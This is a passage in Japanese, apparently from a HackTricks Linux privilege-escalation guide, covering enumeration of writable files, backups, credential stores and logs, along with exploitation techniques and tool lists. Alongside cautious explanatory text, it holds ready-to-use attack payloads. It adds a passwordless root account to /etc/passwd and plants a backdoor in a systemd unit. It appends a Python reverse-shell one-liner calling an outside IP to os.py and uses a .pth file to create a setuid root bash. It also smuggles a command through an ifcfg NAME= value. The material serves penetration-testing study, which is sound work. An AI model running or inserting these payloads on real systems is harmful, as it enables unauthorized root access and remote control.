例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `hacker:hacker` を使って `su` コマンドを実行できます。

または、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

注: BSD プラットフォームでは、`/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` にあり、`/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

**機密性の高いファイルに書き込めるか**確認してください。たとえば、**サービスの設定ファイル**に書き込めますか？

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

たとえば、マシンで **tomcat** サーバーが稼働しており、**/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる**場合、次の行を変更できます。

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

次回 tomcat が起動したときに、backdoor が実行されます。

### フォルダを確認する

以下のフォルダには、バックアップや興味深い情報が含まれている可能性があります。**/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（最後のフォルダはおそらく読み取れませんが、試してみてください）

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### 不審な場所/所有ファイル

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### 過去数分間に変更されたファイル

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DBファイル

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

読み取り可能なアプリケーションデータベースでは、テーブル名とカラム名を確認し、usernameやpassword hashを探します。hashを見つけること、そのpasswordを復元すること、ローカルアカウントで使い回されていることを証明することは、それぞれ別の手順です。32文字の16進数文字列だけでは、MD5であるとも、アカウントにアクセスできるとも判断できません。

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

読み取り可能な shell history に `sudo` コマンドの後にパスワードのような短い行がある場合は、周辺の行を手動で確認してください。通常の `sudo` プロンプトに入力したパスワードは shell history に保存されません。後続の行は誤って shell に入力された可能性があるだけで、有効なパスワードである証拠にはなりません。`.sudo_as_admin_successful` マーカーが記録するのは過去の使用であり、現在の認可状態ではありません。

### 隠しファイル

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH 内のスクリプト/バイナリ**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Webファイル**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **バックアップ**

バックアップディレクトリ内の読み取り可能なファイルに加え、**名前**に `backup` を含むファイルも調べましょう。不透明な名前や暗号化された拡張子のアーカイブでも、古いアプリケーションデータが漏れる可能性があります。暗号化されたアーカイブは、あくまで情報漏えいの候補です。パスワードの復元、内容の確認、アプリケーションのハッシュの復元、そのパスワードを Unix アカウントで再利用できるかの確認は、それぞれ別の手順です。アーカイブ内にハッシュがあっても、ローカルログインが可能だとは限りません。

読み取り可能な仮想マシンのバックアップも同様に確認する価値があります。VirtualBox の `.vbox` 設定ファイルから、接続された `.vdi` イメージを特定でき、暗号化ディスク鍵のメタデータが含まれている場合もあります。[VirtualBox のドキュメント](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html)によると、暗号化データ鍵は VM の設定ファイルに保存されます。オフラインでディスクを確認するには、設定ファイルとイメージの両方にアクセスできる必要があります。ゲストのボリュームに独自の [LUKS 暗号化レイヤー](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc)があり、別の鍵が必要な場合もあります。承認を得て復号した後でも、古いスクリプトや設定ファイルにパスワードが含まれている可能性があります。これをローカル権限昇格と呼ぶ前に、その認証情報がホストアカウントで現在も有効であること、そして実効 `sudo` ポリシーで特権コマンドを実行できることを確認しましょう。受動的な列挙では、イメージをコピー、復号、マウントせずにパスと権限を一覧化してください。

読み取り可能なアーカイブを調べる際は、展開する前にメンバー名を一覧表示しましょう。稼働中のファイルが保護されていても、隠し認証ファイル、リカバリーコードの素材、SSH キーが含まれている可能性があります。ファイル名が示すのは手掛かりにすぎません。素材の内容と、アカウント間で認証情報が再利用されているかは、別途確認してください。

バックアップディレクトリ内では、特に root 所有のアーカイブや、グループメンバーシップを通じてアクセスできるものなど、**別のユーザーが所有する読み取り可能なアーカイブ**を優先して確認しましょう。稼働中のファイルが保護されていても、古いアーカイブに設定情報や認証シークレットが含まれていることがあります。[Backrest](https://garethgeorge.github.io/backrest/) のようなローカルバックアップ UI では、サービスの実効アカウントと、低権限ユーザーがその設定ファイルを読み取れるか、または UI に認証できるかを確認してください。その [hooks](https://garethgeorge.github.io/backrest/docs/hooks) と [restic コマンドインターフェース](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto)は、デーモンのファイル権限とコマンド実行権限で動作する場合があります。ループバックリスナーであることだけでは、影響は判断できません。Backrest の `passwordBcrypt` は、[認証コード](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go)内の bcrypt ハッシュを base64 でエンコードしたものであり、平文パスワードではありません。露出したアーカイブや UI を権限境界として扱う前に、サービスの実行ユーザー、有効な認証情報、対象のプランまたはリポジトリへのアクセスを確認してください。

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### パスワードを含む可能性のある既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)のコードを確認してください。**パスワードを含む可能性のある複数のファイル**を検索します。\
そのために使える**もう1つの興味深いツール**は[**LaZagne**](https://github.com/AlessandroZ/LaZagne)です。Windows、Linux、Macのローカルコンピューターに保存された多数のパスワードを取得するためのオープンソースアプリケーションです。

`/etc/guacamole/guacamole.properties`を読み取れる場合は、`mysql-*`、`postgresql-*`、または`sqlserver-*`のデータベース接続設定を確認してください。アカウントにGuacamoleのJDBCテーブルを読み取る権限がある場合、`guacamole_connection_parameter`に保存済みのSSH `username`、`password`、`private-key`、または`passphrase`の値が含まれている可能性があります。まず接続IDとパラメーター名を確認し、関連する行だけを調べてください。保存された値は、再利用可能な秘密情報ではなく、動的トークンやvaultへの参照である可能性もあります。[Guacamole JDBCスキーマ](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html)と[SSH接続パラメーター](https://guacamole.apache.org/doc/gug/configuring-guacamole.html)を参照してください。

[pswm password manager](https://github.com/Julynx/pswm#usage)は、デフォルトで暗号化されたvaultを`~/.local/share/pswm/pswm`に保存します。他のユーザーのvaultが見える場合は、所有者と、自分のアカウントで実際に読み取れるかを確認してください。vaultのパスだけでは認証情報は分かりません。マスターパスワードの復元、再利用可能なアカウントパスワードの発見、そのアカウントの権限確認は、それぞれ別の手順です。

[Passpieのデフォルトデータベース](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database)は`~/.passpie/`で、`.keys`キーリングと、グループディレクトリ内の暗号化された`.pass`認証情報ファイルで構成されます。データベースディレクトリが見えることは、パスの手掛かりにすぎません。鍵と関連する暗号化エントリーにアクセスできるか、マスターパスフレーズが必要か、復元した認証情報がより高い権限を持つアカウントのものかを確認してください。Passpieは[カスタムデータベースパス](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases)にも対応しているため、デフォルトのパスだけではすべてを網羅できません。自動列挙では、認証情報をエクスポートしたり鍵の内容を表示したりせず、メタデータを一覧表示してください。

### ログ

ログを読み取れる場合、**その中から興味深い情報や機密情報を見つけられる**可能性があります。ログの内容が奇妙であるほど、より興味深いものになるでしょう（おそらく）。\
また、設定が「**不適切な**」（バックドアが仕込まれた？）**監査ログ**の中には、この記事で説明されているように、**パスワードを監査ログに記録できてしまう**ものもあります：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

ログを**読み取るには**、[**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) グループが非常に役立ちます。

### シェルファイル

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### 一般的な認証情報の検索/Regex

ファイル名または内容に「**password**」という単語が含まれるファイルを探し、ログ内のIPアドレスやメールアドレス、ハッシュの正規表現も確認してください。\
これらすべての方法をここで列挙するつもりはありませんが、興味があれば[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)が実行する最後のチェックを確認してください。

## 書き込み可能なファイル

### Python library hijacking

Pythonスクリプトが**どこで**実行されるか分かっていて、そのフォルダーに**書き込める**場合、またはPythonライブラリを**変更できる**場合は、OSライブラリを変更してバックドアを仕込めます（Pythonスクリプトが実行される場所に書き込めるなら、os.pyライブラリをコピーして貼り付けてください）。

**ライブラリにバックドアを仕込む**には、os.pyライブラリの末尾に次の行を追加してください（IPとPORTを変更してください）：

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `site.addsitedir()` で処理される書き込み可能な `.pth`

`site.addsitedir(DIR)` を `sys.path.append(DIR)` と同等に扱わないでください。`DIR` 内のすべての `*.pth` ファイルも処理されます。`import` に続いてスペースまたはタブで始まる行は、Pythonコードとして実行されます。パスの行はサイトディレクトリを基準に解決され、存在する場合にのみ追加されます。<sup>[[38]](#references)</sup>

sudoで許可された、またはその他の特権を持つPythonプログラムが、現在のユーザーまたはそのユーザーが所属するグループによって書き込み可能なディレクトリに対して `site.addsitedir()` を呼び出すと、権限昇格につながります。特権プログラムが通常の処理を開始する前に、importパスを設定する段階で `.pth` のコードが実行されます。<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

実行可能な`.pth`の内容は1行に収める必要がありますが、セミコロンを使えば複数の文を記述できます。たとえば、root権限で実行されるパスからsetuid付きのBashコピーを作成し、`-p`を付けてBashを起動すると、実効IDが保持されます。<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

`-S` オプションが無効にするのは、Python による自動的な `site` 初期化だけです。プログラムが明示的に `site` をインポートして `site.addsitedir()` を呼び出す場合は保護されません。特権プロセスのインポートパスから攻撃者が書き込み可能なディレクトリを削除し、ディレクトリとその `.pth` ファイルの所有者が特権管理者であり、書き込み可能なのもその管理者だけであることを必須にしてください。<sup>[[38]](#references)[[39]](#references)</sup>

### Logrotate の悪用

特権で実行される `logrotate` ジョブは、低い権限のユーザーがローテーション中に置き換えたり、別の場所へリダイレクトしたりできるディレクトリ配下のログを実際にローテーションすると、ユーザー間のファイル書き込み経路を作る可能性があります。ログが書き込み可能というだけでは、調査の手掛かりにすぎません。有効なルールと、その `create`、`olddir`、`su` ディレクティブ、スケジューラーの実効ユーザー、ログの親ディレクトリに対する書き込み権限と検索権限、インストール済みビルドとポリシーが保存先の変更を許可するかを確認してください。また、後で起動する特権シェルが、コマンド実行につなげるために、生成されたファイルを読み込む必要があります。ローテーションを発生させたり、競合状態を試したりせずに、スケジュール、ルール、バージョンやパッケージング、パスのメタデータを調べてください。

> [!TIP]
> `3.18.0` やバージョン文字列だけを、悪用可能性の境界として扱わないでください。[Upstream の変更履歴](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md)には複数のリリースにわたるディレクトリとシンボリックリンクの強化が記録されており、ディストリビューションが修正をバックポートしている場合もあります。[Upstream のマニュアル](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in)では、非特権ユーザーが管理するディレクトリ内のログを root がローテーションする場合、`su` を指定することが推奨されています。有効なルールと実際の挙動を確認してください。

脆弱性の詳しい情報は、こちらのページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。<sup>[[37]](#references)</sup>

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) で悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **（nginx のログ）**と非常によく似ています。そのため、ログを変更できることがわかった場合は、ログを管理しているユーザーを確認し、ログをシンボリックリンクに置き換えて権限昇格できないか調べてください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性の参照先:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)。<sup>[[20]](#references)</sup>

低い権限のユーザーが `ifcfg-*` ファイルを作成または変更でき、かつ特権のネットワーク有効化処理がそのファイルを実際に読み込む場合、そのファイルは調査の手掛かりになります。有効なファイルとディレクトリの権限、選択されたインターフェース、インストール済みの `ifup`/`ifdown` 実装、それらを実行するユーザーを確認してください。ファイルが書き込み可能というだけでは、コードは実行されません。[Red Hat の RHEL 7 ネットワークガイド](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files)では、従来の network scripts と NetworkManager が区別されています。後者が前者を自動的に実行することはありません。[RHEL 8 のドキュメント](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking)によると、デフォルトの `ifup`/`ifdown` は NetworkManager を使用し、オプションの legacy パッケージがシェルスクリプトを提供します。

特権で実行される legacy scripts が実際に使われているシステムでは、`NAME=` のような、引用符で囲まれていないシェル読み込み対象の `ifcfg-*` 割り当てが、コード実行境界を越える可能性があります。ファイル名や NetworkManager の存在からシェルによる解釈を推測せず、正確なパーサー、値、有効化経路を確認してください。呼び出し元の入力を `ifcfg-*` ファイルに書き込み、その後 legacy `ifup` を呼び出すことが許可された sudo ラッパーも、呼び出し元がファイルを直接編集できない場合であっても、この境界に至る別の経路となります。

例: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Network と /bin/id の間に空白があることに注意_)

### **init、init.d、systemd、rc.d**

`/etc/init.d` ディレクトリには、System V init（SysVinit）の**スクリプト**が置かれています。SysVinit は**従来の Linux サービス管理システム**です。サービスの `start`、`stop`、`restart`、場合によっては `reload` を行うスクリプトが含まれています。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat システムでは、別のパスとして `/etc/rc.d/init.d` が使われます。

一方、`/etc/init` は**Upstart**に関連付けられています。Upstart は Ubuntu が導入した新しい**サービス管理システム**で、サービス管理タスク用の設定ファイルを使用します。Upstart への移行後も、Upstart の互換性レイヤーにより SysVinit スクリプトは Upstart の設定と併用されています。

**systemd** は最新の初期化・サービスマネージャーとして登場し、デーモンのオンデマンド起動、automount 管理、システム状態のスナップショットなどの高度な機能を提供します。ディストリビューションパッケージ用の `/usr/lib/systemd/` と、管理者による変更用の `/etc/systemd/system/` にファイルを整理し、システム管理を効率化します。<sup>[[21]](#references)</sup>

## その他のテクニック

### NFS による権限昇格


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### 制限付き Shell からの脱出


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting framework: manager-channel の悪用

Android rooting framework は、一般に syscall をフックし、userspace の manager に特権的な kernel 機能を公開します。manager の認証が弱い場合（例: FD の順序に基づく署名チェックや脆弱なパスワード方式）、ローカルアプリが manager になりすまし、root 化済みデバイスで root 権限を取得できる可能性があります。詳細と exploit の方法はこちら:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## 正規表現ベースの exec による VMware Tools サービス検出 LPE（CWE-426）（CVE-2025-41244）

VMware Tools/Aria Operations の正規表現ベースのサービス検出では、プロセスのコマンドラインからバイナリのパスを抽出し、特権コンテキストで `-v` を付けて実行することがあります。緩いパターン（例: `\S` の使用）は、書き込み可能な場所に攻撃者が配置した listener（例: `/tmp/httpd`）に一致する可能性があり、root としての実行につながります（CWE-426 Untrusted Search Path）。<sup>[[27]](#references)</sup>

詳細と、他の検出・監視スタックにも応用できる一般化されたパターンはこちら:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## さらに詳しく

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc ツール

### **Linux のローカル権限昇格ベクトルを探す最適なツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t オプション)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と MAC の kernel vuln を列挙 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理アクセス):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**その他のスクリプトのまとめ**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning（Crontab UI の privesc、zip -P の認証情報再利用）](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron で実行される monitor 用の偽造 .text_sig payload](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass（sudo env_keep PATH hijack）](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Linux の基本的な権限昇格](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux 権限昇格ガイド](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [攻撃と防御: 2016 年の Linux 権限昇格テクニック](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [誰もコマンド実行を予想しない！](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux 権限昇格)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – ラボ演習の解説 - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux 権限昇格のヒントとテクニック](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux の列挙と権限昇格ツール](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket とは？](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS を使いこなす](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux 権限昇格](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Part-2 – Linux 権限昇格](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux で ACL を管理する方法](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS: network-scripts による root 権限取得](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd とは？](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka（ログ経由の bash 算術式 injection、全体の攻撃チェーン）](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV（非対話型の起動ファイル）](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment（sudo env_keep BASH_ENV → root）](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous（sudo terraform dev_overrides + TF_VAR symlink による privesc）](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik（pg_basebackup cron copy → SUID bash）](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – 名前を付ければ、VMware が権限を昇格する（CVE-2025-41244）](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot による権限昇格](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 と CVE-2025-32463 Sudo 権限昇格の脆弱性](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC リポジトリディレクトリ](https://peps.python.org/pep-3147/)
- [32] [Python importlib ドキュメント](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec の Tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux でのパスワードの記録](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Logrotate の race condition の詳細](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python 3.10 ドキュメント – `site` とパス設定ファイル](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
